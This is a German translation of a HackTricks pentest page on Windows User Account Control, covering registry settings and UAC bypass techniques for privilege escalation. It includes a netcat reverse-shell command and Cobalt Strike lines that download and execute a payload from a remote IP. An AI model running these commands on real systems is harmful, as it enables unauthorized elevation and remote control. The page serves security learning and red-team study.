# UAC - Benutzerkontensteuerung

<details>

<summary>Lernen Sie das Hacken von AWS von Grund auf mit <a href="https://training.hacktricks.xyz/courses/arte">htARTE (HackTricks AWS Red Team Expert)</a>!</summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

- Wenn Sie Ihr Unternehmen in HackTricks bewerben möchten oder HackTricks als PDF herunterladen möchten, überprüfen Sie die [ABONNEMENTPLÄNE](https://github.com/sponsors/carlospolop)!
- Holen Sie sich das offizielle PEASS & HackTricks-Merchandise
- Entdecken Sie die PEASS-Familie, unsere Sammlung exklusiver NFTs
- Treten Sie der Discord-Gruppe oder der Telegramm-Gruppe bei oder folgen Sie uns auf Twitter
- Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die HackTricks- und HackTricks Cloud-GitHub-Repositories senden

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [Trickest](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Benutzerkontensteuerung (UAC)](https://docs.microsoft.com/de-de/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine Zustimmungsaufforderung für erhöhte Aktivitäten ermöglicht. Anwendungen haben unterschiedliche `Integritätsstufen` und ein Programm mit einer **hohen Stufe** kann Aufgaben ausführen, die das System potenziell gefährden könnten. Wenn UAC aktiviert ist, werden Anwendungen und Aufgaben immer unter dem Sicherheitskontext eines Nicht-Administrator-Kontos ausgeführt, es sei denn, ein Administrator autorisiert explizit diese Anwendungen/Aufgaben, um auf das System mit Administratorrechten zuzugreifen und auszuführen. Es handelt sich um eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, wird jedoch nicht als Sicherheitsgrenze betrachtet.

Weitere Informationen zu Integritätsstufen finden Sie hier:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Wenn UAC aktiviert ist, erhält ein Administratorbenutzer 2 Tokens: einen Standardbenutzerschlüssel, um reguläre Aktionen auf regulärem Niveau durchzuführen, und einen mit den Administratorrechten.

Diese [Seite](https://docs.microsoft.com/de-de/windows/security/identity-protection/user-account-control/how-user-account-control-works) erläutert ausführlich, wie UAC funktioniert, einschließlich des Anmeldevorgangs, der Benutzererfahrung und der UAC-Architektur. Administratoren können Sicherheitsrichtlinien verwenden, um zu konfigurieren, wie UAC spezifisch für ihre Organisation auf lokaler Ebene funktioniert (mit secpol.msc) oder konfiguriert und über Gruppenrichtlinienobjekte (GPO) in einer Active Directory-Domänenumgebung bereitgestellt wird. Die verschiedenen Einstellungen werden hier im Detail erläutert [here](https://docs.microsoft.com/de-de/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Es gibt 10 Gruppenrichtlinieneinstellungen, die für UAC festgelegt werden können. Die folgende Tabelle bietet weitere Details:

| Gruppenrichtlinieneinstellung                                                                                                                                                                                                                                                                                                                                                   | Registrierungsschlüssel     | Standard-Einstellung                                         |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Benutzerkontensteuerung: Admin-Zustimmungsmodus für das integrierte Administrator-Konto](https://docs.microsoft.com/de-de/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deaktiviert                                                  |
| [Benutzerkontensteuerung: Zulassen, dass UIAccess-Anwendungen zur Erhöhung ohne Verwendung des sicheren Desktops auffordern](https://docs.microsoft.com/de-de/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deaktiviert                                                  |
| [Benutzerkontensteuerung: Verhalten der Erhöhungsaufforderung für Administratoren im Admin-Zustimmungsmodus](https://docs.microsoft.com/de-de/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Aufforderung zur Zustimmung für nicht-Windows-Binärdateien    |
| [Benutzerkontensteuerung: Verhalten der Erhöhungsaufforderung für Standardbenutzer](https://docs.microsoft.com/de-de/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Aufforderung zur Eingabe von Anmeldeinformationen auf dem sicheren Desktop |
| [Benutzerkontensteuerung: Erkennen von Anwendungsinstallationen und Aufforderung zur Erhöhung](https://docs.microsoft.com/de-de/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Aktiviert (Standard für Home) Deaktiviert (Standard für Unternehmen) |
| [Benutzerkontensteuerung: Nur ausführbare Dateien erhöhen, die signiert und validiert sind](https://docs.microsoft.com/de-de/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deaktiviert                                                  |
| [Benutzerkontensteuerung: Nur UIAccess-Anwendungen erhöhen, die an sicheren Orten installiert sind](https://docs.microsoft.com/de-de/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Aktiviert                                                     |
| [Benutzerkontensteuerung: Alle Administratoren im Admin-Zustimmungsmodus ausführen](https://docs.microsoft.com/de-de/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Aktiviert                                                     |
| [Benutzerkontensteuerung: Zum sicheren Desktop wechseln, wenn zur Erhöhung aufgefordert wird](https://docs.microsoft.com/de-de/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Aktiviert                                                     |
| [Benutzerkontensteuerung: Schreibfehler von Dateien und Registrierung in benutzerspezifischen Speicherorten virtualisieren](https://docs.microsoft.com/de-de/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Aktiviert                                                     |
### UAC-Bypass-Theorie

Einige Programme werden automatisch **automatisch erhöht**, wenn der **Benutzer zur Administratorgruppe gehört**. Diese ausführbaren Dateien enthalten in ihren _**Manifesten**_ die Option _**autoElevate**_ mit dem Wert _**True**_. Die ausführbare Datei muss auch von Microsoft signiert sein.

Um dann die **UAC zu umgehen** (von **mittlerem** Integritätslevel **auf hoch** zu erhöhen), verwenden einige Angreifer diese Art von ausführbaren Dateien, um **beliebigen Code auszuführen**, da er von einem Prozess mit **hohem Integritätslevel** ausgeführt wird.

Sie können das _**Manifest**_ einer ausführbaren Datei mithilfe des Tools _**sigcheck.exe**_ von Sysinternals überprüfen. Und Sie können das **Integritätslevel** der Prozesse mit _Process Explorer_ oder _Process Monitor_ (von Sysinternals) anzeigen.

### UAC überprüfen

Um zu bestätigen, ob UAC aktiviert ist, führen Sie Folgendes aus:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Wenn es **`1`** ist, dann ist UAC **aktiviert**, wenn es **`0`** ist oder es **nicht existiert**, dann ist UAC **inaktiv**.

Dann überprüfen Sie, **welche Stufe** konfiguriert ist:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Wenn **`0`**, dann wird UAC nicht angezeigt (wie **deaktiviert**)
* Wenn **`1`**, wird der Administrator nach Benutzername und Passwort gefragt, um die ausführbare Datei mit hohen Rechten auszuführen (auf dem sicheren Desktop)
* Wenn **`2`** (**Immer benachrichtigen**), wird UAC den Administrator immer um Bestätigung bitten, wenn er versucht, etwas mit hohen Privilegien auszuführen (auf dem sicheren Desktop)
* Wenn **`3`**, wie `1`, aber nicht unbedingt auf dem sicheren Desktop
* Wenn **`4`**, wie `2`, aber nicht unbedingt auf dem sicheren Desktop
* Wenn **`5`** (**Standard**), wird der Administrator um Bestätigung gebeten, um nicht-Windows-Binärdateien mit hohen Privilegien auszuführen

Dann müssen Sie den Wert von **`LocalAccountTokenFilterPolicy`** überprüfen.\
Wenn der Wert **`0`** ist, kann nur der Benutzer mit der RID 500 (**eingebauter Administrator**) administrative Aufgaben ohne UAC ausführen, und wenn er `1` ist, können alle Konten in der Gruppe "Administratoren" dies tun.

Und schließlich werfen Sie einen Blick auf den Wert des Schlüssels **`FilterAdministratorToken`**.\
Wenn **`0`** (Standard), kann das eingebaute Administrator-Konto Remote-Verwaltungsaufgaben ausführen, und wenn **`1`**, kann das eingebaute Administrator-Konto keine Remote-Verwaltungsaufgaben ausführen, es sei denn, `LocalAccountTokenFilterPolicy` ist auf `1` gesetzt.

#### Zusammenfassung

* Wenn `EnableLUA=0` oder **nicht vorhanden**, **kein UAC für niemanden**
* Wenn `EnableLua=1` und **`LocalAccountTokenFilterPolicy=1`**, kein UAC für niemanden
* Wenn `EnableLua=1` und **`LocalAccountTokenFilterPolicy=0` und `FilterAdministratorToken=0`**, kein UAC für RID 500 (eingebauter Administrator)
* Wenn `EnableLua=1` und **`LocalAccountTokenFilterPolicy=0` und `FilterAdministratorToken=1`**, UAC für alle

All diese Informationen können mit dem **Metasploit**-Modul `post/windows/gather/win_privs` gesammelt werden.

Sie können auch die Gruppen Ihres Benutzers überprüfen und das Integritätsniveau erhalten:
```
net user %username%
whoami /groups | findstr Level
```
## UAC-Bypass

{% hint style="info" %}
Beachten Sie, dass es bei grafischem Zugriff auf das Opfer einfach ist, den UAC-Bypass durchzuführen, da Sie einfach auf "Ja" klicken können, wenn die UAC-Aufforderung angezeigt wird.
{% endhint %}

Der UAC-Bypass wird in folgender Situation benötigt: **Der UAC ist aktiviert, Ihr Prozess läuft in einem Kontext mit mittlerer Integrität und Ihr Benutzer gehört zur Administratorengruppe**.

Es ist wichtig zu erwähnen, dass es **viel schwieriger ist, den UAC zu umgehen, wenn er auf dem höchsten Sicherheitslevel (Immer) aktiviert ist, als wenn er auf einem der anderen Level (Standard) aktiviert ist**.

### Deaktivierter UAC

Wenn der UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**), können Sie **eine Reverse-Shell mit Administratorrechten** (hoher Integritätslevel) ausführen, indem Sie beispielsweise Folgendes verwenden:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC-Bypass mit Token-Duplizierung

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sehr** einfacher UAC-"Bypass" (voller Dateisystemzugriff)

Wenn Sie eine Shell mit einem Benutzer haben, der zur Administratorengruppe gehört, können Sie das C$-Freigabe über SMB (Dateisystem) lokal auf einer neuen Festplatte einbinden und haben Zugriff auf alles im Dateisystem (sogar den Administrator-Home-Ordner).

{% hint style="warning" %}
**Es scheint, dass dieser Trick nicht mehr funktioniert**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC-Bypass mit Cobalt Strike

Die Cobalt Strike-Techniken funktionieren nur, wenn die UAC nicht auf ihrem maximalen Sicherheitslevel eingestellt ist.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** und **Metasploit** haben auch mehrere Module zum **Umgehen** der **UAC**.

### KRBUACBypass

Dokumentation und Tool unter [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC-Bypass-Exploits

[**UACME**](https://github.com/hfiref0x/UACME) ist eine **Zusammenstellung** mehrerer UAC-Bypass-Exploits. Beachten Sie, dass Sie UACME mit Visual Studio oder MSBuild **kompilieren müssen**. Die Kompilierung erstellt mehrere ausführbare Dateien (wie `Source\Akagi\outout\x64\Debug\Akagi.exe`), Sie müssen **wissen, welche Sie benötigen**.\
Seien Sie **vorsichtig**, da einige Bypasses **andere Programme auffordern**, die den **Benutzer alarmieren**, dass etwas passiert.

UACME enthält die **Build-Version, ab der jede Technik funktioniert hat**. Sie können nach einer Technik suchen, die Ihre Versionen betrifft:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Auch wenn Sie auf [dieser](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) Seite nachschauen, erhalten Sie die Windows-Version `1607` aus den Build-Versionen.

#### Weitere UAC-Bypasses

**Alle** hier verwendeten Techniken zum Umgehen von UAC erfordern eine **vollständig interaktive Shell** mit dem Opfer (eine gewöhnliche nc.exe-Shell reicht nicht aus).

Sie können eine **Meterpreter-Sitzung** verwenden. Wechseln Sie zu einem **Prozess**, dessen **Session**-Wert gleich **1** ist:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ sollte funktionieren)

### UAC-Bypass mit GUI

Wenn Sie Zugriff auf eine **GUI haben, können Sie die UAC-Prompt einfach akzeptieren**, wenn Sie ihn erhalten. Sie benötigen keinen Bypass. Wenn Sie Zugriff auf eine GUI-Sitzung erhalten, die jemand verwendet hat (möglicherweise über RDP), gibt es **einige Tools, die als Administrator ausgeführt werden**, von denen aus Sie z. B. eine **cmd** direkt als Administrator ausführen können, ohne erneut von UAC aufgefordert zu werden, wie [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dies könnte etwas **unauffälliger** sein.

### Lauter Brute-Force-UAC-Bypass

Wenn es Ihnen nichts ausmacht, laut zu sein, können Sie immer etwas wie [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ausführen, das **berechtigte Berechtigungen anfordert, bis der Benutzer sie akzeptiert**.

### Eigener Bypass - Grundlegende UAC-Bypass-Methodik

Wenn Sie sich **UACME** ansehen, werden Sie feststellen, dass **die meisten UAC-Bypasses eine Dll-Hijacking-Schwachstelle ausnutzen** (hauptsächlich durch Schreiben der bösartigen DLL in _C:\Windows\System32_). [Lesen Sie dies, um zu erfahren, wie Sie eine Dll-Hijacking-Schwachstelle finden](../windows-local-privilege-escalation/dll-hijacking.md).

1. Finden Sie eine ausführbare Datei, die **automatisch erhöhte Rechte** hat (überprüfen Sie, ob sie beim Ausführen mit hoher Integrität ausgeführt wird).
2. Suchen Sie mit Procmon nach "**NAME NOT FOUND**"-Ereignissen, die anfällig für **DLL-Hijacking** sein können.
3. Sie müssen wahrscheinlich die DLL in einigen **geschützten Pfaden** (wie C:\Windows\System32) schreiben, für die Sie keine Schreibberechtigungen haben. Sie können dies umgehen, indem Sie:
1. **wusa.exe**: Windows 7, 8 und 8.1. Es ermöglicht das Extrahieren des Inhalts einer CAB-Datei in geschützte Pfade (weil dieses Tool mit hoher Integrität ausgeführt wird).
2. **IFileOperation**: Windows 10.
4. Bereiten Sie ein **Skript** vor, um Ihre DLL in den geschützten Pfad zu kopieren und die anfällige und automatisch erhöhte ausführbare Datei auszuführen.

### Eine weitere UAC-Bypass-Technik

Besteht darin, zu überwachen, ob eine **automatisch erhöhte ausführbare Datei** versucht, aus der **Registrierung** den **Namen/Pfad** einer **ausführbaren Datei** oder eines **Befehls** zum **Ausführen** abzurufen (dies ist interessanter, wenn die ausführbare Datei diese Informationen in der **HKCU** sucht).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen** möchten, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
